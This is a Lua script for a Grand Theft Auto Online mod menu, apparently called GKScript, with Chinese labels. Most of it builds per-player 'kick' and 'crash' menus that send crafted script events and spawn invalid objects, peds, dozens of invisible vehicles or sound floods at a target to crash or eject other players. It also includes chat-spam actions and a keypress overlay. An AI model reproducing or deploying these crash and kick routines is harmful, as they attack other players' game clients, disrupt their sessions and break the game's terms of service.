    menu.action(this_veh_root, "删除", {"deletemenyoov" .. vehicle}, "删除此车辆。让它不复存在。", function()
        for k,v in pairs(all_entities) do
            entities.delete_by_handle(v)
        end
        menu.delete(this_veh_root)
        HUD.SET_BLIP_ALPHA(this_blip, 0)
        --HUD.REMOVE_BLIP(this_blip)
    end)
    menu.action(this_veh_root, "传送到内部", {"teleportemenyoov" .. vehicle}, "oh fuck yeah ride it", function()
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), vehicle, -1)
    end)
    return vehicle
end

if SCRIPT_MANUAL_START then

do_label_preset("HUD_JOINING", "正使用GKscript加入GTA在线模式")
do_label_preset("MP_SPINLOADING", "Isn't GK Script the best?")
menu.trigger_commands("luagkv145")
end



function send_script_event(first_arg, receiver, args)
	table.insert(args, 1, first_arg)
	util.trigger_script_event(1 << receiver, args)
end


	local Languages = {
	
	{ Name = "简中", Key = "zh-CN" },

}

local LangKeys = {}
local LangName = {}
local LangIndexes = {}
local LangLookupByName = {}
local LangLookupByKey = {}
local PlayerSpooflist = {}
local PlayerSpoof = {}

for i=1,#Languages do
	local Language = Languages[i]
	LangKeys[i] = Language.Name
	LangName[i] = Language.Name
	LangIndexes[Language.Key] = i
	LangLookupByName[Language.Name] = Language.Key
	LangLookupByKey[Language.Key] = Language.Name
end

table.sort(LangKeys)

function encode(text)
	return string.gsub(text, "%s", "+")
end




KickScriptEvent = {
1674887089,
608596116,
1781594056,
-442434037
    }

function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end

function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

util.keep_running()



GenerateFeatures = function(PlayerID)
    menu.divider(menu.player_root(PlayerID), "GKScript")
    PlayerMainMenu = menu.list(menu.player_root(PlayerID), "GK移除选项", {}, "", function(); end)
	

    KickMenu = menu.list(PlayerMainMenu, "踢出", {}, "", function(); end)
	
	menu.action(KickMenu,"网络保释", {},"bail", function()
		util.trigger_script_event(1 << PlayerID,{1674887089, pid})
		util.trigger_script_event(1 << PlayerID,{608596116, pid})
		for i, v in ipairs(KickScriptEvent) do
            par1 = math.random(-2147483647, 2147483647)
            util.trigger_script_event(1 << PlayerID, {v, PlayerID, par1,par1,par1,par1,par1,par1,par1,par1})
            util.yield(10)
        end
		end)
		

	
	
    CrashMenu = menu.list(PlayerMainMenu, "崩溃", {}, "", function(); end)

    menu.action(CrashMenu, "脚本事件崩溃", {}, "", function()
        util.trigger_script_event(1 << PlayerID, { -555356783, PlayerID ,85952,99999,52682274855,526822745 })
        util.trigger_script_event(1 << PlayerID, { 526822748, PlayerID ,78552,99999 ,7949161,789454312})
        util.trigger_script_event(1 << PlayerID, { -66669983, PlayerID ,526822748,555555, math.random(80521,2959749521) })
        util.trigger_script_event(1 << PlayerID, { -1733737974, PlayerID ,789522 ,59486,48512151,-9545440,5845131,848153,math.random(1,2959749),189958})
        util.trigger_script_event(1 << PlayerID, { -1529596656, PlayerID ,795221,59486,48512151,-9545440 , math.random(1,2959749) })
        util.trigger_script_event(1 << PlayerID, { -8965204809, PlayerID ,795221,59486,48512151,-9545440 })
    end)

    menu.action(CrashMenu, "无效物体崩溃", {}, "崩丫的", function()
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateObject(0x7367D224, TargetPlayerPos)
        local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
        local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
        local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
        local Object_pizza5 = CreateObject(0xFBF7D21F, TargetPlayerPos)
        local Object_pizza6 = CreateObject(3613262246, TargetPlayerPos)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza3)
        entities.delete_by_handle(Object_pizza4)
        entities.delete_by_handle(Object_pizza5)
        entities.delete_by_handle(Object_pizza6)
    end)
	
		menu.click_slider(CrashMenu, "导弹车崩溃", {"Chernobog Crash"}, "1 = V1, 2 = V2", 1, 2, 1, 1, function(on_change)
	if on_change == 1 then	
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
		SpawnedVehicleList = { };
		for i = 1, 60 do
			local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
			ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
			ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
            util.yield(50)
        end
        util.yield(5000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnedVehicleList[i])
        end
        menu.trigger_commands("anticrashcam off")

	end	
    if on_change == 2 then
	    menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        TargetPlayerPos.y = TargetPlayerPos.y + 1050
		SpawnedVehicleList1 = { };
		for i = 1, 60 do
			local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList1[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
			ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList1[i], true)
			ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList1[i], false, 0)
            util.yield(50)
        end
        util.yield(2000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnedVehicleList1[i])
        end

        util.yield(1000)
        SpawnedVehicleList2 = { };
		for i = 1, 50 do
			local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList2[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
			ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList2[i], true)
			ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList2[i], false, 0)
            util.yield(50)
        end
        util.yield(2000)
        for i = 1, 50 do
            entities.delete_by_handle(SpawnedVehicleList2[i])
        end

        menu.trigger_commands("anticrashcam off")
    end
	end)
	
	    menu.action(CrashMenu, "无效衣服崩溃", {}, "",  function()
		menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
        local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        for i = 0, 500 do
            PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
			ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
            util.yield(10)
        end
        entities.delete_by_handle(Spawned_Mike)
        menu.trigger_commands("anticrashcam off")
    end)

	
    menu.action(CrashMenu, "维德崩溃", {}, "崩丫的", function()
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnPed_Wade = { }
        for i = 1, 60 do
            SpawnPed_Wade[i] = CreatePed(26, util.joaat("ig_wade"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            util.yield(1)
        end
        util.yield(5000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnPed_Wade[i])
        end
        menu.trigger_commands("anticrashcam off")
    end)


    menu.action(CrashMenu, "拖车崩溃", {}, "崩丫的", function()
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
		SpawnedDune1 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune1, true)
		SpawnedDune2 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune2, true)
		SpawnedBarracks1 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks1, true)
		SpawnedBarracks2 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks2, true)
		SpawnedTowtruck = CreateVehicle(util.joaat("towtruck2"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedTowtruck, true)
		SpawnedBarracks31 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks31, true)
		SpawnedBarracks32 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks32, true)

		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        for i = 0, 100 do
            TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(SpawnedTowtruck)
        entities.delete_by_handle(SpawnedDune1)
        entities.delete_by_handle(SpawnedDune2)
        entities.delete_by_handle(SpawnedBarracks31)
        entities.delete_by_handle(SpawnedBarracks32)
        entities.delete_by_handle(SpawnedBarracks1)
        entities.delete_by_handle(SpawnedBarracks2)
    end)
	
	menu.action(CrashMenu, "主机崩溃", {}, "",function()
	local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    menu.trigger_commands("tpmazehelipad")
	ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
	util.yield(1000)
    menu.trigger_commands("tpmazehelipad")
end)
	
	menu.click_slider(CrashMenu, "声音崩溃" , {}, "崩溃其他玩家游戏",1, 2, 1, 1, function(on_change)
	if on_change == 1 then
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 10000, false)
            end
            util.yield()
        end
	end
	if on_change == 2 then
	    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 1000
        while time > util.current_time_millis() do
        local pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Object_Dropped_Remote', pos.x,pos.y,pos.z, 'GTAO_FM_Events_Soundset', true, 10000, false)
        end
        util.yield()
		end
    end
	end)
	
	menu.action(CrashMenu, "美杜莎", {}, "", function ()
	
	MDS(pid)
	
	end)
	
	menu.action(CrashMenu, "载具动作崩溃", {}, "崩溃绿玩或外置菜单（2-10S生效）", function()
	      local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		  local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
		  pos.z = pos.z + 10
		  veh = entities.get_all_vehicles_as_handles()
		  
        for i = 1, #veh do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
		end
	end)
    
	
	
	menu.action(CrashMenu, "富兰克林崩溃", {}, "崩溃绿玩或不那么昂贵的菜单", function()
	    util.toast("The crash has started. Please stay away from the player and do not watch the player")
		menu.trigger_commands("anticrashcam on")
		local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
		for i = 0 , 30 do 
			invalidpeda1 = CreatePed(26, util.joaat("player_one"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
			ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
			util.yield(1)
		end
		util.yield(1)
		for i = 0 , 30 do 
			invalidpeda2 = CreatePed(26, util.joaat("player_one"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
			ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
			util.yield(1)
		end
		util.yield(1)
		for i = 0 , 50 do 
			invalidpeda3 = CreatePed(26, util.joaat("player_one"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
			ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
			util.yield(1)
		end
		util.yield(5000)
		util.yield(300)
		notification("崩溃完成，等待删除PED",colors.red)
		util.yield(300)
		local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
		notification("done",colors.red)
		util.yield(300)
		menu.trigger_commands("anticrashcam off")
	end)
	
end
    
	
local InitialPlayersList = players.list(true, true, true)
for i=1, #InitialPlayersList do
	GenerateFeatures(InitialPlayersList[i])
end

players.on_join(GenerateFeatures)

local resolves = {
	"ez",
	"didn't stand a chance",
    "Crash addiction satisfied"
}

--[[function KickV1(pid, repeats) -- works
	for i = 1, repeats do
		for i,v in ipairs(kicks_fast_legacy) do
			arg = math.random(461950868, 999999999)
			send_script_event(v, pid, {pid, arg, arg})
			util.yield()
		end
	end
end]]

function Crash(pid) 
	for i,v in ipairs(crashes) do
		par1 = math.random(-100000, 99999999)
		par2 = math.random(-4827432, 3231229)
		par3 = math.random(46190868, 999999999)
		par4 = math.random(-133223, 42746729)
		par5 = math.random(-999999999, 428747628)
		send_script_event(v, pid, {pid, par1, par2, par3, par4, par5})
		util.yield()
	end
end


drift = false
function drift(toggle)

	if drift then
		while true do
			local veh = entities.get_user_vehicle_as_handle()
			if veh then
				if PAD.IS_CONTROL_PRESSED(1, 61) then
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, true)
				else
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
				end
			end        
			util.yield()
		end
	end
end

selectedplayer = {}
for b = 0, 32 do
    selectedplayer[b] = false
end
excludeselected = false



cmd_id = {}
for a = 0, 32 do
	cmd_id[a] = 0
end



attachspam = {}
for a = 0, 32 do
	attachspam[a] = 0
end

local enablechatjudge = true
local crashdtc, kickdtc, crashdtc2, kickdtc2, crashdtc3, kickdtc4
local crashdtcbeg, kickdtcbeg = true, false



local attachvehstest = {
	"adder",
	"zentorno"
}

local attachvehs = {
	"adder",
	"zentorno",
	"buzzard",
	"bullet",
	"frogger",
	"blista",
	"cargobob",
	"dinghy",
	"dilettante",
	"asterope",
	"banshee",
	"krieger",
	"insurgent2",
	"patriot2",
	"starling",
	"nimbus",
	"bus",
	"titan",
	"shamal",
	"luxor",
	"duster",
	"molotok",
	"bombushka",
	"xls2",
	"zorusso",
	"jetmax",
	"dump",
	"kosatka",
	"cargoplane",
	"stockade",
	"rhino"
}

local bigvehs = {
	"volatol",
	"bombushka",
	"kosatka",
	"cargoplane",
	"alkonost",
	"rhino",
	"blimp",
	"blimp2",
	"bus",
	"jet",
	"luxor2"
}

local volatols = {
	"volatol"
}

local bombushkas = {
	"bombushka"
}

local kosatkas = {
	"kosatka"
}

local cargoplanes = {
	"cargoplane"
}

local alkonosts = {
	"alkonost"
}

local planes = {
	"luxor",
	"alphaz1",
	"avenger",
	"besra",
	"blimp",
	"blimp2",
	"cuban800",
	"dodo",
	"duster",
	"howard",
	"hydra",
	"jet",
	"lazer",
	"luxor2",
	"mammatus",
	"mijet",
	"molotok",
	"nokota",
	"pyro",
	"shamal"
}


local exists1, exists2, exists3 = false, false, false

local chaos, gravity, speed = false, true, 100

VT = menu.list(menu.my_root(), "按键显示", {}, "", function(); end)

menu.toggle(VT, '切换叠加', {'wasd-overlay'}, '', function(on) 
	run = on
end, true)
menu.slider(VT, 'X轴坐标', {'x-position'}, '',1 , 10000, overlay_x * 10000, 1, function(value)
	overlay_x = value / 10000
end)
menu.slider(VT, 'Y轴坐标', {'y-position'}, '',1 , 10000, overlay_y * 10000, 1, function(value)
	overlay_y = value / 10000
end)
menu.slider(VT, '尺寸', {'size'}, '',1 , 10000, 300, 1, function(value)
	size = value / 10000
    boxMargin = size / 7
end)
local hideKey = false
menu.toggle(VT, '隐藏按键文本', {'hide-text'}, '', function(toggle)
    hideKey = toggle
end)
local color_root = menu.list(VT, '颜色', {''}, '')
menu.colour(color_root, '文本颜色', {'text-color'}, '', key_text_color, true, function(colour)
    key_text_color = colour
end)
menu.colour(color_root, '背景颜色', {'bg-color'}, '', background_colour, true, function(colour)
    background_colour = colour
end)
menu.rainbow(menu.colour(color_root, '按钮颜色', {'press-color'}, '', pressed_background_colour, true, function(colour)
    pressed_background_colour = colour
end))

local wasd = {
    [1]  = { keys = {44, 52, 85, 138, 141, 152, 205, 264},                                               pressed = false, key = 'Q',     show = true },
    [2]  = { keys = {32, 71, 77, 87, 129, 136, 150, 232},                                                pressed = false, key = 'W',     show = true },
    [3]  = { keys = {38, 46, 51, 54, 86, 103, 119, 153, 184, 206, 350, 351, 355, 356},                   pressed = false, key = 'E',     show = true },
    [4]  = { keys = {45, 80, 140, 250, 263, 310},                                                        pressed = false, key = 'R',     show = true },
    [5]  = { keys = {34 ,63, 89, 133, 147, 234, 338},                                                    pressed = false, key = 'A',     show = true },
    [6]  = { keys = {8, 31, 33, 72, 78, 88, 130, 139, 149, 151, 196, 219, 233, 268, 269, 302},           pressed = false, key = 'S',     show = true },
    [7]  = { keys = {9, 30, 35, 59, 64, 90, 134, 146, 148, 195, 218, 235, 266, 267, 278, 279, 339, 342}, pressed = false, key = 'D',     show = true },
    [8]  = { keys = {23, 49, 75, 145, 185, 251},                                                         pressed = false, key = 'F',     show = true },
    [9]  = { keys = {21, 61, 131, 155, 209, 254, 340, 352},                                              pressed = false, key = 'Shift', show = true },
    [10] = { keys = {36, 60, 62, 132, 224, 280, 281, 326, 341, 343},                                     pressed = false, key = 'Ctrl',  show = true },
    [11] = { keys = {18, 22, 55, 76, 102, 143, 179, 203, 216, 255, 298, 321, 328, 353},                  pressed = false, key = 'Space', show = true },
}
local hide_root = menu.list(VT, '隐藏按键', {''}, '')
for i = 1, #wasd do
    menu.toggle(hide_root, wasd[i].key, {}, '', function(toggle)
        wasd[i].show = not toggle
    end)
end

menu.toggle(VT, '短空格键', {'short-space'}, '', function(toggle)
    if toggle then
        spaceBarLength = 2
    else
        spaceBarLength = 3
    end
end)
menu.toggle(VT, '窄空格键', {'slim-space'}, '', function(toggle)
    if toggle then
        spaceBarSlim = 2
    else
        spaceBarSlim = 1
    end
end)
local center_space_toggle center_space_toggle = menu.toggle(VT, '中间空格键', {'alt-space'}, '使空格在 A、S、D 下居中。这需要shift和ctrl关闭.', function(toggle)
    if altShiftCtrl and (wasd[10].show or wasd[9].show) then
        altSpaceBar = 1
        return
    end
    if toggle then
        altSpaceBar = 0
    else
        altSpaceBar = 1
    end
end, true)

menu.toggle(VT, '窄 shift和ctrl键', {'slim-shift-ctrl'}, '', function(toggle)
    altShiftCtrl = toggle
    if toggle and menu.get_value(center_space_toggle) == 1 then
        menu.trigger_command(center_space_toggle, 'off')
    else
        menu.trigger_command(center_space_toggle, 'on')
    end
end)

util.create_tick_handler(function()
    if run then
        for i = 1, #wasd do
            wasd[i].pressed = false
            for j = 1, #wasd[i].keys do
                if PAD.IS_CONTROL_PRESSED(2, wasd[i].keys[j]) then
                    wasd[i].pressed = true
                end
            end
        end
        for i = 1, #wasd - 3 do
            if wasd[i].show then
                directx.draw_rect(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1), overlay_y + (i > 4 and (boxMargin + size * ratio) or 0)* 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
                if not hideKey then
                    directx.draw_text(overlay_x + (boxMargin + size) * (i > 4 and i - 5 or i - 1)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
                end
            end
        end
        if altShiftCtrl then
            if wasd[#wasd - 2].show then
                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 2].pressed and pressed_background_colour or background_colour)
            end
            if wasd[#wasd - 1].show then
                directx.draw_rect(overlay_x, overlay_y + (boxMargin + size)* ratio * 2.5,(boxMargin + size) - boxMargin, size * ratio / 2, wasd[#wasd - 1].pressed and pressed_background_colour or background_colour)
            end
        else
            for i = 9, 10 do
                if wasd[i].show then
                directx.draw_rect(overlay_x - (boxMargin + size), overlay_y + (boxMargin + size * ratio) * (i - 8) * 1.05, size, size * ratio, wasd[i].pressed and pressed_background_colour or background_colour)
                if not hideKey then
                    directx.draw_text(overlay_x - (boxMargin + size)+ size * 0.45,(i > 4 and  overlay_y + (boxMargin + size * ratio) * (i - 8)* 1.2 or  overlay_y*1.07) , wasd[i].key, 1, size *20, key_text_color, false)
                end
                end
            end
        end
        if wasd[#wasd].show then
            directx.draw_rect(overlay_x + (boxMargin + size) * altSpaceBar, overlay_y + (boxMargin + size)* ratio * 2,(boxMargin + size) * spaceBarLength - boxMargin, size * ratio / spaceBarSlim, wasd[#wasd].pressed and pressed_background_colour or background_colour)
        end
	end
end)




	local menyoo_root = menu.list(menu.my_root(), "Menyoo XML模组", {"menyoo"}, "Menyoo 支持!")


    Chat = menu.list(menu.my_root(), "聊天选项", {}, "极小可能会ban卡", function(); end)
	menu.action(Chat,"清屏", {},"",function()
	for i = 1, 100 do
    local ret = "  "
        chat.send_message(ret, false, true, true)
	end
    end)
	
	menu.action(Chat,"十八大", {},"",function()
	local shiba1 = "全面推进依法治国，必须贯彻落实党的十八大和十八届三中全会精神"
    local shiba2 = "高举中国特色社会主义伟大旗帜"
    local shiba3 = "以马克思列宁主义、毛泽东思想、邓小平理论、三个代表重要思想、科学发展观为指导"
    local shiba4 = "深入贯彻习近平总书记系列重要讲话精神"
	chat.send_message(shiba1, false, true, true)
	util.yield(5000)
	chat.send_message(shiba2, false, true, true)
	util.yield(2000)
	chat.send_message(shiba3, false, true, true)
	util.yield(7000)
	chat.send_message(shiba4, false, true, true)
	util.yield(1000)
	end)
	
	menu.action(Chat,"二十大",{},"",function()
	local ershi1 = "深入学习党的十九大及十九届历次全会精神，深刻领会“两个确立”的决定性意义，不断增强“两个维护”的政治自觉、思想自觉、行动自觉，确保在政治立场、政治方向、政治原则、政治道路上始终同以习近平同志为核心的党中央保持高度一致"
	local ershi2 = "带头学习贯彻习近平新时代中国特色社会主义思想，坚持用马克思主义之“矢”去射新时代中国之“的”。扎实开展党史学习教育，自觉弘扬伟大建党精神，始终掌握新时代新征程党和国家事业发展的历史主动"
	local ershi3 = "坚决贯彻落实党中央决策部署和习近平总书记重要指示批示精神，统筹推进疫情防控和经济社会发展、统筹发展和安全，增强斗争精神和斗争本领，分类精准施策，积极研究推动分管领域工作，认真完成党中央赋予的职责任务"
	local ershi4 = "认真履行全面从严治党主体责任，严格执行请示报告制度，扎实推进分管领域党风廉政建设和反腐败工作，切实加强领导班子和干部队伍建设，全面提高党的建设质量"
	local ershi5 = "严格落实中央八项规定及其实施细则精神，坚持以身作则、廉洁自律，坚决反对形式主义、官僚主义，坚决反对特权思想，从严教育管理亲属和身边工作人员，主动接受各方面监督"
	chat.send_message(ershi1, false, true, true)
	util.yield(11000)
	chat.send_message(ershi2, false, true, true)
	util.yield(11000)
	chat.send_message(ershi3, false, true, true)
	util.yield(8000)
	chat.send_message(ershi4, false, true, true)
	util.yield(5000)
	chat.send_message(ershi5, false, true, true)
	util.yield(5000)
	end)
	
	menu.action(Chat,"Ikun",{},"",function()
	local ik1 = "向阳花木易为春，听说你爱蔡徐坤"
	local ik2 = "千军万马是ikun，ikun永远爱坤坤"
	local ik3 = "待我ikun更强大，定帮坤哥赢天下"
	local ik4 = "两耳不闻窗外事，一心只为蔡徐坤"
	local ik5 = "追梦少年不失眠，未来可期蔡徐坤"
	local ik6 = "向阳花木每逢春，ikun一直爱坤坤"
	local ik7 = "落红飞雪漫纷纷，心头只有蔡徐坤"
	local ik8 = "黄鹤楼是烟，蔡徐坤是天"
	local ik10 = "狮子座为王，蔡徐坤为皇"
	local ik11 = "可乐要加冰，爱坤要用心"
	local ik12 = "披荆斩棘，护坤为王"
	local ik13 = "未来可期，余生陪坤"
	chat.send_message(ik1, false, true, true)
		util.yield(1000)
	chat.send_message(ik2, false, true, true)
		util.yield(1000)
	chat.send_message(ik3, false, true, true)
		util.yield(1000)
	chat.send_message(ik4, false, true, true)
		util.yield(1000)
	chat.send_message(ik5, false, true, true)
		util.yield(1000)
	chat.send_message(ik6, false, true, true)
		util.yield(1000)
	chat.send_message(ik7, false, true, true)
		util.yield(1000)
	chat.send_message(ik8, false, true, true)
